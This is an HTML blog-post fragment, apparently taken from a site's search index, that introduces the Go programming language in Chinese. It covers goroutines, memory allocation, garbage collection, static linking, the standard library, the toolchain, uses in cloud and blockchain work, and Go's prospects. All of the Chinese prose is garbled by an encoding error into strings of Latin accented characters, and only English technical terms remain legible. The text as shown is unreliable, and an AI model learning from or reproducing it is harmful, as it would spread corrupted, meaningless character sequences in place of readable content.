<p>æ—¶è‡³ä»Šæ—¥ï¼Œå¹¶å‘ç¼–ç¨‹å·²æˆä¸ºç¨‹åºå‘˜çš„åŸºæœ¬æŠ€èƒ½ï¼Œåœ¨å„ä¸ªæŠ€æœ¯ç¤¾åŒºéƒ½èƒ½çœ‹åˆ°è¯¸å¤šä¸ä¹‹ç›¸å…³çš„è®¨è®ºä¸»é¢˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹Goè¯­è¨€å´ä¸€åå¸¸æ€åšäº†ä»¶æå¤§èƒ†çš„äº‹ï¼Œä»æ ¹æœ¬ä¸Šå°†ä¸€åˆ‡éƒ½å¹¶å‘åŒ–ï¼Œè¿è¡Œæ—¶ç”¨ Goroutine è¿è¡Œæ‰€æœ‰çš„ä¸€åˆ‡ï¼ŒåŒ…æ‹¬ main.main å…¥å£å‡½æ•°ã€‚</p>
<p>å¯ä»¥è¯´ï¼ŒGoroutine æ˜¯ Go æœ€æ˜¾è‘—çš„ç‰¹å¾ã€‚å®ƒç”¨ç±»åç¨‹çš„æ–¹å¼æ¥å¤„ç†å¹¶å‘å•å…ƒï¼Œå´åˆåœ¨è¿è¡Œæ—¶å±‚é¢åšäº†æ›´æ·±åº¦çš„ä¼˜åŒ–å¤„ç†ã€‚è¿™ä½¿å¾—è¯­æ³•ä¸Šçš„å¹¶å‘ç¼–ç¨‹å˜å¾—æä¸ºå®¹æ˜“ï¼Œæ— é¡»å¤„ç†å›è°ƒï¼Œæ— é¡»å…³æ³¨çº¿ç¨‹åˆ‡æ¢ï¼Œä»…ä¸€ä¸ªå…³é”®å­—ï¼Œç®€å•è€Œè‡ªç„¶ã€‚</p>
<p>æ­é… channelï¼Œå®ç° CSP æ¨¡å‹ã€‚å°†å¹¶å‘å•å…ƒé—´çš„æ•°æ®è€¦åˆæ‹†è§£å¼€æ¥ï¼Œå„å¸å…¶èŒï¼Œè¿™å¯¹æ‰€æœ‰çº ç»“äºå†…å­˜å…±äº«ã€é”ç²’åº¦çš„å¼€å‘äººå‘˜éƒ½æ˜¯ä¸€ä¸ªå¯æœŸç›¼çš„è§£è„±ã€‚è‹¥è¯´æœ‰æ‰€ä¸è¶³ï¼Œé‚£å°±æ˜¯åº”è¯¥æœ‰ä¸ªæ›´å¤§çš„è®¡åˆ’ï¼Œå°†é€šä¿¡ä»è¿›ç¨‹å†…æ‹“å±•åˆ°è¿›ç¨‹å¤–ï¼Œå®ç°çœŸæ­£æ„ä¹‰ä¸Šçš„åˆ†å¸ƒå¼ã€‚</p>
<blockquote>
<p>å†…å­˜åˆ†é…</p>
</blockquote>
<p>å°†ä¸€åˆ‡å¹¶å‘åŒ–å›ºç„¶æ˜¯å¥½ï¼Œä½†å¸¦æ¥çš„é—®é¢˜åŒæ ·å¾ˆå¤šã€‚å¦‚ä½•å®ç°é«˜å¹¶å‘ä¸‹çš„å†…å­˜åˆ†é…å’Œç®¡ç†å°±æ˜¯ä¸ªéš¾é¢˜ã€‚å¥½åœ¨ Go é€‰æ‹©äº† tcmalloc [ <em>tcmalloc</em>å…¨ç§°Thread-Caching Mallocï¼Œå³çº¿ç¨‹ç¼“å­˜çš„mallocï¼Œå®ç°äº†é«˜æ•ˆçš„å¤šçº¿ç¨‹å†…å­˜ç®¡ç† ]ï¼Œå®ƒæœ¬å°±æ˜¯ä¸ºå¹¶å‘è€Œè®¾è®¡çš„é«˜æ€§èƒ½å†…å­˜åˆ†é…ç»„ä»¶ã€‚</p>
<p>å¯ä»¥è¯´ï¼Œå†…å­˜åˆ†é…å™¨æ˜¯è¿è¡Œæ—¶ä¸‰å¤§ç»„ä»¶é‡Œå˜åŒ–æœ€å°‘çš„éƒ¨åˆ†ã€‚åˆ¨å»å› é…åˆåƒåœ¾å›æ”¶å™¨è€Œä¿®æ”¹çš„å†…å®¹ï¼Œå†…å­˜åˆ†é…å™¨å®Œæ•´ä¿ç•™äº† tcmalloc çš„åŸå§‹æ¶æ„ã€‚ä½¿ç”¨ cache ä¸ºå½“å‰æ‰§è¡Œçº¿ç¨‹æä¾›æ— é”åˆ†é…ï¼Œå¤šä¸ª central åœ¨ä¸åŒçº¿ç¨‹é—´å¹³è¡¡å†…å­˜å•å…ƒå¤ç”¨ã€‚åœ¨æ›´é«˜å±‚æ¬¡é‡Œï¼Œheap åˆ™ç®¡ç†ç€å¤§å—å†…å­˜ï¼Œç”¨ä»¥åˆ‡åˆ†æˆä¸åŒç­‰çº§çš„å¤ç”¨å†…å­˜å—ã€‚å¿«é€Ÿåˆ†é…å’ŒäºŒçº§å†…å­˜å¹³è¡¡æœºåˆ¶ï¼Œè®©å†…å­˜åˆ†é…å™¨èƒ½ä¼˜ç§€åœ°å®Œæˆé«˜å‹åŠ›ä¸‹çš„å†…å­˜ç®¡ç†ä»»åŠ¡ã€‚</p>
<p>åœ¨æœ€è¿‘å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œç¼–è¯‘å™¨ä¼˜åŒ–å“æœ‰æˆæ•ˆã€‚å®ƒä¼šç«­åŠ›å°†å¯¹è±¡åˆ†é…åœ¨æ ˆä¸Šï¼Œä»¥é™ä½åƒåœ¾å›æ”¶å‹åŠ›ï¼Œå‡å°‘ç®¡ç†æ¶ˆè€—ï¼Œæå‡æ‰§è¡Œæ€§èƒ½ã€‚å¯ä»¥è¯´ï¼Œé™¤å¶å°”å› æ€§èƒ½é—®é¢˜è€Œè¢«è¿«é‡‡ç”¨å¯¹è±¡æ± å’Œè‡ªä¸»å†…å­˜ç®¡ç†å¤–ï¼Œæˆ‘ä»¬åŸºæœ¬æ— é¡»å‚ä¸å†…å­˜ç®¡ç†æ“ä½œã€‚</p>
<blockquote>
<p>åƒåœ¾å›æ”¶</p>
</blockquote>
<p>åƒåœ¾å›æ”¶ä¸€ç›´æ˜¯ä¸ªéš¾é¢˜ã€‚æ—©å¹´é—´ï¼Œ[Java]å°±å› åƒåœ¾å›æ”¶ä½æ•ˆè¢«å˜²ç¬‘äº†è®¸ä¹…ï¼Œåæ¥ Sun è¿ç»­æ”¶çº³äº†å¥½å¤šäººæ‰å’ŒæŠ€æœ¯æ‰å‘å±•åˆ°ä»Šå¤©ã€‚å¯å³ä¾¿å¦‚æ­¤ï¼Œåœ¨ Hadoop ç­‰å¤§å†…å­˜åº”ç”¨åœºæ™¯ä¸‹ï¼Œåƒåœ¾å›æ”¶ä¾æ—§æ‰è¥Ÿè§è‚˜ã€æ­¥å±¥ç»´è‰°ã€‚</p>
<p>ç›¸æ¯” Javaï¼ŒGo é¢ä¸´çš„å›°éš¾è¦æ›´å¤šã€‚å› æŒ‡é’ˆçš„å­˜åœ¨ï¼Œæ‰€ä»¥å›æ”¶å†…å­˜ä¸èƒ½åšæ”¶ç¼©å¤„ç†ã€‚å¹¸å¥½ï¼ŒæŒ‡é’ˆè¿ç®—è¢«é˜»æ­¢ï¼Œå¦åˆ™è¦åšåˆ°ç²¾ç¡®å›æ”¶éƒ½éš¾ã€‚</p>
<p>æ¯æ¬¡å‡çº§ï¼Œåƒåœ¾å›æ”¶å™¨å¿…ç„¶æ˜¯æ ¸å¿ƒç»„ä»¶é‡Œä¿®æ”¹æœ€å¤šçš„éƒ¨åˆ†ã€‚ä»å¹¶å‘æ¸…ç†ï¼Œåˆ°é™ä½ STW æ—¶é—´ï¼Œç›´åˆ° Go çš„ 1.5 ç‰ˆæœ¬å®ç°å¹¶å‘æ ‡è®°ï¼Œé€æ­¥å¼•å…¥ä¸‰è‰²æ ‡è®°å’Œå†™å±éšœç­‰ç­‰ï¼Œéƒ½æ˜¯ä¸ºäº†èƒ½è®©åƒåœ¾å›æ”¶åœ¨ä¸å½±å“ç”¨æˆ·é€»è¾‘çš„æƒ…å†µä¸‹æ›´å¥½åœ°å·¥ä½œã€‚å°½ç®¡æœ‰äº†åŠªåŠ›ï¼Œå½“å‰ç‰ˆæœ¬çš„åƒåœ¾å›æ”¶ç®—æ³•ä¹Ÿåªèƒ½è¯´å ªç”¨ï¼Œç¦»å¥½ç”¨å°šæœ‰ä¸å°‘è·ç¦»ã€‚</p>
<blockquote>
<p>é™æ€é“¾æ¥</p>
</blockquote>
<p>Go åˆšå‘å¸ƒæ—¶ï¼Œé™æ€é“¾æ¥è¢«å½“ä½œä¼˜ç‚¹å®£ä¼ ã€‚åªé¡»ç¼–è¯‘åçš„ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ— é¡»é™„åŠ ä»»ä½•ä¸œè¥¿å°±èƒ½éƒ¨ç½²ã€‚è¿™ä¼¼ä¹å¾ˆä¸é”™ï¼Œåªæ˜¯åæ¥é£æ°”å˜äº†ã€‚è¿ç€å‡ ä¸ªç‰ˆæœ¬ï¼Œç¼–è¯‘å™¨éƒ½åœ¨å®Œå–„åŠ¨æ€åº“ buildmode åŠŸèƒ½ï¼Œåœºé¢ä¸€æ—¶å˜å¾—æœ‰äº›å°´å°¬ã€‚</p>
<p>æš‚ä¸è¯´æœªå®Œå·¥çš„ buildmode æ¨¡å¼ï¼Œé™æ€ç¼–è¯‘çš„å¥½å¤„æ˜¾è€Œæ˜“è§ã€‚å°†è¿è¡Œæ—¶ã€ä¾èµ–åº“ç›´æ¥æ‰“åŒ…åˆ°å¯æ‰§è¡Œæ–‡ä»¶å†…éƒ¨ï¼Œç®€åŒ–äº†éƒ¨ç½²å’Œå‘å¸ƒæ“ä½œï¼Œæ— é¡»äº‹å…ˆå®‰è£…è¿è¡Œç¯å¢ƒå’Œä¸‹è½½è¯¸å¤šç¬¬ä¸‰æ–¹åº“ã€‚è¿™ç§ç®€å•æ–¹å¼å¯¹äºç¼–å†™ç³»ç»Ÿè½¯ä»¶æœ‰ç€æå¤§å¥½å¤„ï¼Œå› ä¸ºåº“ä¾èµ–ä¸€ç›´éƒ½æ˜¯ä¸ªéº»çƒ¦ã€‚</p>
<blockquote>
<p>æ ‡å‡†åº“</p>
</blockquote>
<p>åŠŸèƒ½å®Œå–„ã€è´¨é‡å¯é çš„æ ‡å‡†åº“ä¸ºç¼–ç¨‹è¯­è¨€æä¾›äº†å……è¶³åŠ¨åŠ›ã€‚åœ¨ä¸å€ŸåŠ©ç¬¬ä¸‰æ–¹æ‰©å±•çš„æƒ…å†µä¸‹ï¼Œå°±å¯å®Œæˆå¤§éƒ¨åˆ†åŸºç¡€åŠŸèƒ½å¼€å‘ï¼Œè¿™å¤§å¤§é™ä½äº†å­¦ä¹ å’Œä½¿ç”¨æˆæœ¬ã€‚æœ€å…³é”®çš„æ˜¯ï¼Œæ ‡å‡†åº“æœ‰å‡çº§å’Œä¿®å¤ä¿éšœï¼Œè¿˜èƒ½ä»è¿è¡Œæ—¶è·å¾—æ·±å±‚æ¬¡ä¼˜åŒ–çš„ä¾¿åˆ©ï¼Œè¿™æ˜¯ç¬¬ä¸‰æ–¹åº“æ‰€ä¸å…·å¤‡çš„ã€‚</p>
<p>Go æ ‡å‡†åº“è™½ç§°ä¸å¾—å®Œå…¨è¦†ç›–ï¼Œä½†ä¹Ÿç®—æä¸ºä¸°å¯Œã€‚å…¶ä¸­å€¼å¾—ç§°é“çš„æ˜¯ net&#x2F;httpï¼Œä»…é¡»ç®€å•å‡ æ¡è¯­å¥å°±èƒ½å®ç°ä¸€ä¸ªé«˜æ€§èƒ½ Web Serverï¼Œè¿™ä»æ¥éƒ½æ˜¯å®£ä¼ çš„äº®ç‚¹ã€‚æ›´ä½•å†µå¤§æ‰¹åŸºäºæ­¤çš„ä¼˜ç§€ç¬¬ä¸‰æ–¹ Framework æ›´æ˜¯å°† Go æ¨åˆ° Web&#x2F;Microservice å¼€å‘æ ‡å‡†ä¹‹ä¸€çš„ä½ç½®ã€‚</p>
<p>å½“ç„¶ï¼Œä¼˜ç§€ç¬¬ä¸‰æ–¹èµ„æºä¹Ÿæ˜¯è¯­è¨€ç”Ÿæ€åœˆçš„é‡è¦ç»„æˆéƒ¨åˆ†ã€‚è¿‘å¹´æ¥å´›èµ·çš„å‡ é—¨è¯­è¨€ä¸­ï¼ŒGo ç®—æ˜¯ç‹¬æ ‘ä¸€å¸œï¼Œå¤§æ‰¹ä¼˜ç§€ä½œå“é¢‘ç¹æ¶Œç°ï¼Œè¿™ä¹Ÿç»™æˆ‘ä»¬å­¦ä¹  Go æä¾›äº†å¾ˆå¥½çš„å‚ç…§ã€‚</p>
<blockquote>
<p>å·¥å…·é“¾</p>
</blockquote>
<p>å®Œæ•´çš„å·¥å…·é“¾å¯¹äºæ—¥å¸¸å¼€å‘æä¸ºé‡è¦ã€‚Go åœ¨æ­¤åšå¾—ç›¸å½“ä¸é”™ï¼Œæ— è®ºæ˜¯ç¼–è¯‘ã€æ ¼å¼åŒ–ã€é”™è¯¯æ£€æŸ¥ã€å¸®åŠ©æ–‡æ¡£ï¼Œè¿˜æ˜¯ç¬¬ä¸‰æ–¹åŒ…ä¸‹è½½ã€æ›´æ–°éƒ½æœ‰å¯¹åº”çš„å·¥å…·ã€‚å…¶åŠŸèƒ½æœªå¿…å®Œå–„ï¼Œä½†èµ·ç ç®—å¾—ä¸Šç®€å•æ˜“ç”¨ã€‚</p>
<p>å†…ç½®å®Œæ•´æµ‹è¯•æ¡†æ¶ï¼Œå…¶ä¸­åŒ…æ‹¬å•å…ƒæµ‹è¯•ã€æ€§èƒ½æµ‹è¯•ã€ä»£ç è¦†ç›–ç‡ã€æ•°æ®ç«äº‰ï¼Œä»¥åŠç”¨æ¥è°ƒä¼˜çš„ pprofï¼Œè¿™äº›éƒ½æ˜¯ä¿éšœä»£ç èƒ½æ­£ç¡®è€Œç¨³å®šè¿è¡Œçš„å¿…å¤‡åˆ©å™¨ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜å¯é€šè¿‡ç¯å¢ƒå˜é‡è¾“å‡ºè¿è¡Œæ—¶ç›‘æ§ä¿¡æ¯ï¼Œå°¤å…¶æ˜¯åƒåœ¾å›æ”¶å’Œå¹¶å‘è°ƒåº¦è·Ÿè¸ªï¼Œå¯è¿›ä¸€æ­¥å¸®åŠ©æˆ‘ä»¬æ”¹è¿›ç®—æ³•ï¼Œè·å¾—æ›´ä½³çš„è¿è¡ŒæœŸè¡¨ç°ã€‚</p>
<h2 id="å­¦ä¹ Goè¯­è¨€å¯ä»¥å¹²ä»€ä¹ˆï¼Ÿ"><a href="#å­¦ä¹ Goè¯­è¨€å¯ä»¥å¹²ä»€ä¹ˆï¼Ÿ" class="headerlink" title="å­¦ä¹ Goè¯­è¨€å¯ä»¥å¹²ä»€ä¹ˆï¼Ÿ"></a>å­¦ä¹ Goè¯­è¨€å¯ä»¥å¹²ä»€ä¹ˆï¼Ÿ</h2><p>Go è¯­è¨€ä»å‘å¸ƒ 1.0 ç‰ˆæœ¬ä»¥æ¥å¤‡å—ä¼—å¤šå¼€å‘è€…å…³æ³¨å¹¶å¾—åˆ°å¹¿æ³›ä½¿ç”¨ï¼Œ<strong>Go è¯­è¨€çš„ç®€å•ã€é«˜æ•ˆã€å¹¶å‘ç‰¹æ€§å¸å¼•äº†ä¼—å¤šä¼ ç»Ÿè¯­è¨€ï¼ˆCã€C#ã€Javaã€Pythonï¼‰å¼€å‘è€…çš„åŠ å…¥</strong>ï¼Œè€Œä¸”äººæ•°è¶Šæ¥è¶Šå¤šã€‚</p>
<p>é‰´äºGoè¯­è¨€çš„ç‰¹ç‚¹å’Œè®¾è®¡çš„åˆè¡·ï¼ŒGoè¯­è¨€ä½œä¸ºæœåŠ¡å™¨ç¼–ç¨‹è¯­è¨€ï¼Œå¾ˆé€‚åˆå¤„ç†æ—¥å¿—ã€æ•°æ®æ‰“åŒ…ã€è™šæ‹Ÿæœºå¤„ç†ã€æ–‡ä»¶ç³»ç»Ÿã€åˆ†å¸ƒå¼ç³»ç»Ÿã€æ•°æ®åº“ä»£ç†ç­‰ï¼›ç½‘ç»œç¼–ç¨‹æ–¹é¢ï¼ŒGoè¯­è¨€å¹¿æ³›åº”ç”¨äºWeb åº”ç”¨ã€APIåº”ç”¨ã€ä¸‹è½½åº”ç”¨ç­‰ï¼›é™¤æ­¤ä¹‹å¤–ï¼ŒGoè¯­è¨€è¿˜é€‚ç”¨äºå†…å­˜æ•°æ®åº“å’Œäº‘å¹³å°é¢†åŸŸï¼ˆä¸­é—´ä»¶ï¼‰ï¼Œç›®å‰å›½å¤–å¾ˆå¤šäº‘å¹³å°éƒ½æ˜¯é‡‡ç”¨Goå¼€å‘ã€‚ </p>
<p><strong>æœåŠ¡å™¨ç¼–ç¨‹ï¼š</strong>ä»¥å‰ä½ å¦‚æœä½¿ç”¨Cæˆ–è€…C++åšçš„é‚£äº›äº‹æƒ…ï¼Œç”¨Goæ¥åšå¾ˆåˆé€‚ï¼Œä¾‹å¦‚å¤„ç†æ—¥å¿—ã€æ•°æ®æ‰“åŒ…ã€è™šæ‹Ÿæœºå¤„ç†ã€æ–‡ä»¶ç³»ç»Ÿç­‰ã€‚</p>
<p><strong>åˆ†å¸ƒå¼ç³»ç»Ÿã€æ•°æ®åº“ä»£ç†å™¨ã€ä¸­é—´ä»¶</strong>ï¼šä¾‹å¦‚Etcdã€‚</p>
<p><strong>ç½‘ç»œç¼–ç¨‹ï¼š</strong>è¿™ä¸€å—ç›®å‰åº”ç”¨æœ€å¹¿å¸‚åœºå¤§ï¼ŒåŒ…æ‹¬Webåº”ç”¨ã€APIåº”ç”¨ã€ä¸‹è½½åº”ç”¨ï¼Œè€Œä¸”Goå†…ç½®çš„net&#x2F;httpåŒ…åŸºæœ¬ä¸ŠæŠŠæˆ‘ä»¬å¹³å¸¸ç”¨åˆ°çš„ç½‘ç»œåŠŸèƒ½éƒ½å®ç°äº†ã€‚<strong>åŸç”Ÿçš„ç½‘ç»œç¼–ç¨‹</strong>æ‰æ˜¯æ ¸å¿ƒï¼Œæ¡†æ¶åªæ˜¯è®©æˆ‘ä»¬å·æ‡’çš„ï¼Œå¿«é€Ÿå¼€å‘ï¼</p>
<p><strong>å¼€å‘äº‘å¹³å°ï¼š</strong>ç›®å‰å›½å¤–å¾ˆå¤šäº‘å¹³å°åœ¨é‡‡ç”¨Goå¼€å‘ï¼Œæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„<strong>ä¸ƒç‰›äº‘ã€åä¸ºäº‘</strong>ç­‰ç­‰éƒ½æœ‰ä½¿ç”¨Goè¿›è¡Œå¼€å‘å¹¶ä¸”å¼€æºçš„æˆå‹çš„äº§å“ã€‚</p>
<p><strong>åŒºå—é“¾ï¼š</strong>ç›®å‰æœ‰ä¸€ç§è¯´æ³•ï¼ŒæŠ€æœ¯ä»ä¸šäººå‘˜æŠŠGoè¯­è¨€ç§°ä½œä¸ºåŒºå—é“¾è¡Œä¸šçš„å¼€å‘è¯­è¨€ã€‚å¦‚æœå¤§å®¶å­¦ä¹ åŒºå—é“¾æŠ€æœ¯çš„è¯ï¼Œå°±ä¼šå‘ç°ç°åœ¨æœ‰å¾ˆå¤šå¾ˆå¤šçš„åŒºå—é“¾çš„ç³»ç»Ÿå’Œåº”ç”¨éƒ½æ˜¯é‡‡ç”¨Goè¿›è¡Œå¼€å‘çš„ï¼Œæ¯”å¦‚ehtereumæ˜¯ç›®å‰çŸ¥ååº¦æœ€å¤§çš„å…¬é“¾ï¼Œå†æ¯”å¦‚fabricæ˜¯ç›®å‰æœ€çŸ¥åçš„è”ç›Ÿé“¾ï¼Œä¸¤è€…éƒ½æœ‰goè¯­è¨€çš„ç‰ˆæœ¬ï¼Œä¸”go-ehtereumè¿˜æ˜¯ä»¥å¤ªåŠå®˜æ–¹æ¨èçš„ç‰ˆæœ¬ã€‚</p>
<p>ä¸­å¿ƒåŒ–ï¼šæˆ‘ä»¬çš„æ•°æ®éƒ½ä¸æ˜¯åœ¨æˆ‘ä»¬æ‰‹ä¸Šï¼</p>
<p>å»ä¸­å¿ƒåŒ–ï¼šæœ€ç»ˆæŠŠæ•°æ®æ‰€æœ‰æƒæ”¾åˆ°æˆ‘ä»¬è‡ªå·±æ‰‹ä¸Š !</p>
<p>åŒºå—é“¾ ï¼šå»ä¸­å¿ƒåŒ–çš„æŠ€æœ¯ ã€‚ å›½å®¶æ˜¯æå€¡ï¼ˆæœ‰é™åˆ¶çš„ï¼Œéƒ¨åˆ†æ•°æ®ä¸€æ ·åœ¨ä¸­å¤®æ‰‹ä¸Šï¼ï¼‰</p>
<p>Go åµŒå…¥å¼ </p>
<p><strong>ç›®å‰æ¥çœ‹ï¼ŒGoåœ¨å›½å†…çš„å‘å±•å’Œç¤¾åŒºåŠ¨æ€åŠ¿å¤´ä¹Ÿéƒ½ä¸é”™ï¼Œå¼€å‘è€…ç¾¤ä½“ä¹Ÿè¶Šæ¥è¶Šå¤šã€‚5-10å¹´çš„äº‹ä¸š</strong></p>
<h2 id="å…³äºGoè¯­è¨€æœªæ¥çš„å±•æœ›"><a href="#å…³äºGoè¯­è¨€æœªæ¥çš„å±•æœ›" class="headerlink" title="å…³äºGoè¯­è¨€æœªæ¥çš„å±•æœ›"></a>å…³äºGoè¯­è¨€æœªæ¥çš„å±•æœ›</h2><p>ä¸€å®¶å«åš Docker çš„å…¬å¸ã€‚å°±æ˜¯ä½¿ç”¨ Go è¿›è¡Œé¡¹ç›®å¼€å‘ï¼Œå¹¶ä¿ƒè¿›äº†è®¡ç®—æœºé¢†åŸŸçš„å®¹å™¨è¡Œä¸šï¼Œè¿›è€Œå‡ºç°äº†åƒ Kubernetes è¿™æ ·çš„é¡¹ç›®ã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥è¯´ Go æ˜¯å®¹å™¨è¯­è¨€ï¼Œè¿™æ˜¯å¦ä¸€ä¸ªå®Œå…¨å‡ºä¹æ„æ–™çš„ç»“æœã€‚</p>
<p>é™¤äº†å¤§åé¼é¼çš„Dockerï¼Œå®Œå…¨ç”¨GOå®ç°ã€‚ä¸šç•Œæœ€ä¸ºç«çˆ†çš„å®¹å™¨ç¼–æ’ç®¡ç†ç³»ç»Ÿkuberneteså®Œå…¨ç”¨GOå®ç°ã€‚ä¹‹åçš„Docker Swarmï¼Œå®Œå…¨ç”¨GOå®ç°ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰å„ç§æœ‰åçš„é¡¹ç›®ï¼Œå¦‚etcd&#x2F;consul&#x2F;flannelï¼Œä¸ƒç‰›äº‘å­˜å‚¨ç­‰ç­‰ å‡ä½¿ç”¨GOå®ç°ã€‚æœ‰äººè¯´ï¼ŒGOè¯­è¨€ä¹‹æ‰€ä»¥å‡ºåï¼Œæ˜¯èµ¶ä¸Šäº†äº‘æ—¶ä»£ã€‚ä½†ä¸ºä»€ä¹ˆä¸èƒ½æ¢ç§è¯´æ³•ï¼Ÿä¹Ÿæ˜¯GOè¯­è¨€ä¿ƒä½¿äº†äº‘çš„å‘å±•ã€‚</p>
<p>é™¤äº†äº‘é¡¹ç›®å¤–ï¼Œè¿˜æœ‰åƒä»Šæ—¥å¤´æ¡ã€UBERè¿™æ ·çš„å…¬å¸ï¼Œä»–ä»¬ä¹Ÿä½¿ç”¨GOè¯­è¨€å¯¹è‡ªå·±çš„ä¸šåŠ¡è¿›è¡Œäº†å½»åº•çš„é‡æ„ã€‚</p>
<p>Goè¯­è¨€æ˜¯è°·æ­Œ2009å¹´å‘å¸ƒçš„ç¬¬äºŒæ¬¾å¼€æºç¼–ç¨‹è¯­è¨€ï¼ˆç³»ç»Ÿå¼€å‘è¯­è¨€)ï¼Œå®ƒæ˜¯åŸºäºç¼–è¯‘ã€åƒåœ¾æ”¶é›†å’Œå¹¶å‘çš„ç¼–ç¨‹è¯­è¨€ã€‚</p>
<p>Goè¯­è¨€ä¸“é—¨é’ˆå¯¹å¤šå¤„ç†å™¨ç³»ç»Ÿåº”ç”¨ç¨‹åºçš„ç¼–ç¨‹è¿›è¡Œäº†ä¼˜åŒ–ï¼Œä½¿ç”¨Goç¼–è¯‘çš„ç¨‹åºå¯ä»¥åª²ç¾ C &#x2F; C++ä»£ç çš„é€Ÿåº¦ï¼Œè€Œä¸”æ›´åŠ å®‰å…¨ã€æ”¯æŒå¹¶è¡Œè¿›ç¨‹ã€‚</p>
<p>ä½œä¸ºå‡ºç°åœ¨21ä¸–çºªçš„è¯­è¨€ï¼Œå…¶è¿‘Cçš„æ‰§è¡Œæ€§èƒ½å’Œè¿‘è§£æå‹è¯­è¨€çš„å¼€å‘æ•ˆç‡ï¼Œä»¥åŠè¿‘ä¹äºå®Œç¾çš„ç¼–è¯‘é€Ÿåº¦ï¼Œå·²ç»é£é¡å…¨çƒã€‚</p>
<p>ç‰¹åˆ«æ˜¯åœ¨äº‘é¡¹ç›®ä¸­ï¼Œå¤§éƒ¨åˆ†éƒ½ä½¿ç”¨äº†Golangæ¥å¼€å‘ã€‚ä¸å¾—ä¸è¯´ï¼ŒGolangæ—©å·²æ·±å…¥äººå¿ƒã€‚è€Œå¯¹äºä¸€ä¸ªæ²¡æœ‰å†å²è´Ÿæ‹…çš„æ–°é¡¹ç›®ï¼ŒGolangæˆ–è®¸å°±æ˜¯ä¸ªä¸äºŒçš„é€‰æ‹©ã€‚</p>
<p>å¾ˆå¤šäººå°†Goè¯­è¨€ç§°ä¸º21ä¸–çºªçš„Cè¯­è¨€ï¼Œå› ä¸ºGoä¸ä»…æ‹¥æœ‰Cçš„ç®€æ´å’Œæ€§èƒ½ã€‚è€Œä¸”è¿˜å¾ˆå¥½çš„æä¾›äº†21ä¸–çºªäº’è”ç½‘ç¯å¢ƒä¸‹æœåŠ¡ç«¯å¼€å‘çš„å„ç§å®ç”¨ç‰¹æ€§ã€‚</p>
<p>è¢«ç§°ä¸ºGoè¯­è¨€ä¹‹çˆ¶çš„ç½—å‹ƒÂ·æ´¾å…‹(Rob Pike)å°±æ›¾è¯´è¿‡ï¼Œä½ æ˜¯å¦åŒæ„Goè¯­è¨€ï¼Œå–å†³äºä½ æ˜¯è®¤å¯å°‘å°±æ˜¯å¤šï¼Œè¿˜æ˜¯å°‘å°±æ˜¯å°‘(Less is more or less is less)ã€‚Goè¯­è¨€çš„æ•´ä¸ªè®¾è®¡å“²å­¦å°±æ˜¯ï¼šå°†ç®€å•ã€å®ç”¨ä½“ç°å¾—æ·‹æ¼“å°½è‡´ã€‚</p>
<p>å¦‚ä»Š Go å·²ç»æ˜¯äº‘è®¡ç®—ç¼–ç¨‹è¯­è¨€ï¼ŒGOè¯­è¨€èƒŒé Googleè¿™æ£µå¤§æ ‘ï¼Œåˆä¸ä¹ç‰›äººåé•‡ï¼Œæ˜¯åå‰¯å…¶å®çš„â€œç‰›äºŒä»£â€ã€‚æƒ³è±¡ä¸€ä¸‹ï¼šä¸€ä¸ªåªæœ‰åå‡ å¹´å‘å±•ç»å†çš„ç¼–ç¨‹è¯­è¨€ï¼Œå·²ç»æˆä¸ºäº†å¦‚æ­¤å·¨å¤§è€Œä¸”æ­£åœ¨ä¸æ–­å‘å±•çš„è¡Œä¸šçš„ä¸»å¯¼è€…ï¼Œè¿™ç§æˆåŠŸæ˜¯æ¯ä¸ªäººéƒ½æ— æ³•æƒ³è±¡çš„ã€‚</p>
<p><strong>Goè¯­è¨€è¿Ÿæ—©ä¼šè¿æ¥ä¸€ä¸ªå±äºå®ƒçš„æ—¶ä»£ï¼</strong></p>
<p>æ¬²å·¥å–„å…¶äº‹ã€å¿…å…ˆåˆ©å…¶å™¨ï¼</p>
<ul>
<li>Goè¯­è¨€æœ¬èº«</li>
<li>Goè¯­è¨€çš„å¼€å‘å·¥å…·</li>
</ul>
]]></content>
  </entry>
</search>
